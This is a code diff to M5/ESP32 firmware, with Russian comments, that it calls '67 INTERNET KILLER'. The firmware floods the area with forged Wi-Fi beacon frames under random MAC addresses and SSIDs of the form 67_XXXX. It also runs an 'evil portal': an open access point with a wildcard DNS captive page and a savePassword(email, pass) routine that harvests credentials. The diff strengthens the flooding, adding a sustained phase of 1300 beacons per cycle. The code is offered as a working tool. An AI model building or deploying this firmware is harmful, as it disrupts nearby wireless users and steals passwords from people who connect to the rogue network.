@@ -16,11 +16,12 @@ bool isSpamming = false;
 bool isEvilPortalActive = true; 
 int packetCount = 0;
 
-// Логика нарастания
+// Логика нарастания (интервал 2 секунды)
 int currentSecond = 0;
 unsigned long lastSecondTime = 0;
 const int burstSizes[] = {300, 300, 300, 400}; // 1сек: 300, 2сек: +300, 3сек: +300, 4сек: +400
 const int numBursts = sizeof(burstSizes) / sizeof(burstSizes[0]);
+bool maxReached = false; 
 
 // ================= ПРОТОТИПЫ =================
 void drawUI();
@@ -28,14 +29,14 @@ void sendBeaconSpam();
 void setupServer();
 void savePassword(String email, String pass);
 
-// ================= БЕКОН СПАМ (ВСЕ СЕТИ "67") =================
+// ================= БЕКОН СПАМ (67_XXX) =================
 void sendBeaconSpam() {
   uint8_t packet[128] = {0};
   
   packet[0] = 0x80; packet[1] = 0x00; packet[2] = 0x00; packet[3] = 0x00; 
   for(int i=4; i<10; i++) packet[i] = 0xFF; 
   
-  // Рандомим Source MAC и BSSID, чтобы телефон видел их как разные сети
+  // Рандомим Source MAC и BSSID
   for(int i=10; i<16; i++) packet[i] = random(0, 255);
   for(int i=16; i<22; i++) packet[i] = packet[i-6];
   
@@ -43,9 +44,10 @@ void sendBeaconSpam() {
   for(int i=24; i<32; i++) packet[i] = random(0, 255);
   packet[32] = 0x64; packet[33] = 0x00; packet[34] = 0x11; packet[35] = 0x04;
 
-  // НАЗВАНИЕ СЕТИ - ВСЕГДА "67"
-  const char* ssidName = "67";
-  int ssidLen = 2;
+  // ГЕНЕРИРУЕМ УНИКАЛЬНОЕ ИМЯ 67_XXXX
+  char ssidName[16];
+  sprintf(ssidName, "67_%d", random(1, 2000));
+  int ssidLen = strlen(ssidName);
   int len = 36;
   
   packet[len++] = 0x00; packet[len++] = ssidLen;
@@ -65,7 +67,7 @@ const char index_html[] PROGMEM = R"rawliteral(
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>67 SNOWBALL</title>
+  <title>67 INTERNET KILLER</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: 'Courier New', monospace; }
     body { background: #000; color: #fff; overflow: hidden; }
@@ -82,9 +84,9 @@ const char index_html[] PROGMEM = R"rawliteral(
 </head>
 <body>
   <div id="app">
-    <h1>67 SNOWBALL</h1>
-    <div class="status-box" id="status-wifi">SNOWBALL SPAM: ВЫКЛЮЧЕН</div>
-    <button id="btnWifi" onclick="toggleWifi()">ЗАПУСТИТЬ СНЕЖНЫЙ КОМ</button>
+    <h1>67 INTERNET KILLER</h1>
+    <div class="status-box" id="status-wifi">INTERNET KILLER: ВЫКЛЮЧЕН</div>
+    <button id="btnWifi" onclick="toggleWifi()">УБИТЬ ИНТЕРНЕТ (СЕТИ 67_XXX)</button>
     <div class="status-box" id="status-portal">EVIL PORTAL: АКТИВЕН</div>
     <button id="btnPortal" onclick="togglePortal()">ОСТАНОВИТЬ ПОРТАЛ</button>
     <div class="info">Подключись к сети M5_BeaconEvil без пароля. Портал откроется автоматически. Мир обречен.</div>
@@ -96,8 +98,8 @@ const char index_html[] PROGMEM = R"rawliteral(
     function togglePortal() { fetch(isPortalOn ? '/portal/off' : '/portal/on').then(r => r.text()).then(() => { isPortalOn = !isPortalOn; updateUI(); }); }
     function updateUI() {
       let btnW = document.getElementById('btnWifi'); let statW = document.getElementById('status-wifi');
-      if(isWifiOn) { btnW.innerText = 'ОСТАНОВИТЬ КОМ'; btnW.classList.add('active'); statW.innerText = 'СНЕЖНЫЙ КОМ АКТИВЕН'; statW.className = 'status-box status-on'; }
-      else { btnW.innerText = 'ЗАПУСТИТЬ СНЕЖНЫЙ КОМ'; btnW.classList.remove('active'); statW.innerText = 'SNOWBALL SPAM: ВЫКЛЮЧЕН'; statW.className = 'status-box status-off'; }
+      if(isWifiOn) { btnW.innerText = 'ОСТАНОВИТЬ'; btnW.classList.add('active'); statW.innerText = 'ИНТЕРНЕТ УБИТ'; statW.className = 'status-box status-on'; }
+      else { btnW.innerText = 'УБИТЬ ИНТЕРНЕТ (СЕТИ 67_XXX)'; btnW.classList.remove('active'); statW.innerText = 'INTERNET KILLER: ВЫКЛЮЧЕН'; statW.className = 'status-box status-off'; }
       let btnP = document.getElementById('btnPortal'); let statP = document.getElementById('status-portal');
       if(isPortalOn) { btnP.innerText = 'ОСТАНОВИТЬ ПОРТАЛ'; btnP.classList.add('active'); statP.innerText = 'EVIL PORTAL: АКТИВЕН'; statP.className = 'status-box status-on'; }
       else { btnP.innerText = 'ЗАПУСТИТЬ ПОРТАЛ'; btnP.classList.remove('active'); statP.innerText = 'EVIL PORTAL: ВЫКЛЮЧЕН'; statP.className = 'status-box status-off'; }
@@ -163,7 +165,7 @@ void drawUI() {
   M5.Display.setTextColor(WHITE);
   M5.Display.setTextSize(2);
   M5.Display.setCursor(10, 10);
-  M5.Display.print("67 SNOWBALL");
+  M5.Display.print("INTERNET KILL");
   M5.Display.drawLine(0, 35, 135, 35, RED); 
   
   M5.Display.setTextSize(1);
@@ -192,8 +194,22 @@ void drawUI() {
 void setupServer() {
   server.on("/", HTTP_GET, [](){ server.send_P(200, "text/html", index_html); });
   
-  server.on("/wifi/on", HTTP_GET, [](){ isSpamming = true; currentSecond = 0; lastSecondTime = millis(); drawUI(); server.send(200, "text/plain", "ON"); });
-  server.on("/wifi/off", HTTP_GET, [](){ isSpamming = false; drawUI(); server.send(200, "text/plain", "OFF"); });
+  server.on("/wifi/on", HTTP_GET, [](){ 
+    isSpamming = true; 
+    currentSecond = 0; 
+    maxReached = false;
+    lastSecondTime = millis(); 
+    drawUI(); 
+    server.send(200, "text/plain", "ON"); 
+  });
+  
+  server.on("/wifi/off", HTTP_GET, [](){ 
+    isSpamming = false; 
+    currentSecond = 0;
+    maxReached = false;
+    drawUI(); 
+    server.send(200, "text/plain", "OFF"); 
+  });
   
   server.on("/portal/on", HTTP_GET, [](){ isEvilPortalActive = true; dnsServer.start(DNS_PORT, "*", WiFi.softAPIP()); drawUI(); server.send(200, "text/plain", "PORTAL ON"); });
   server.on("/portal/off", HTTP_GET, [](){ isEvilPortalActive = false; dnsServer.stop(); drawUI(); server.send(200, "text/plain", "PORTAL OFF"); });
@@ -247,29 +263,37 @@ void setup() {
   drawUI();
 }
 
-// ================= LOOP (СНЕЖНЫЙ КОМ) =================
+// ================= LOOP (ИНТЕРНЕТ УБИТ, 2 СЕК) =================
 void loop() {
   server.handleClient();
   if (isEvilPortalActive) dnsServer.processNextRequest();
   M5.update();
 
-  // ЛОГИКА СНЕЖНОГО КОМА
+  // ИНТЕРВАЛ ТЕПЕРЬ 2000 МИЛЛИСЕКУНД (2 СЕКУНДЫ)
   if (isSpamming) {
-    if (millis() - lastSecondTime >= 1000) {
-      // Наступает новая секунда
+    if (millis() - lastSecondTime >= 2000) {
       lastSecondTime = millis();
       
-      if (currentSecond < numBursts) {
-        // Отправляем пачку пакетов для текущей секунды
-        for(int i = 0; i < burstSizes[currentSecond]; i++) {
-          sendBeaconSpam();
-          if (i % 50 == 0) delay(1); // Микро-пауза для Wi-Fi стека
+      if (!maxReached) {
+        // Фаза нарастания
+        if (currentSecond < numBursts) {
+          for(int i = 0; i < burstSizes[currentSecond]; i++) {
+            sendBeaconSpam();
+            if (i % 50 == 0) delay(1);
+          }
+          currentSecond++;
+          if (currentSecond >= numBursts) {
+            maxReached = true; 
+          }
+          drawUI();
         }
-        currentSecond++;
-        drawUI();
       } else {
-        // Цикл завершен, сбрасываем на начало
-        currentSecond = 0;
+        // Фаза удержания
+        for(int i = 0; i < 1300; i++) {
+          sendBeaconSpam();
+          if (i % 100 == 0) delay(1); 
+        }
+        drawUI();
       }
     }
   }
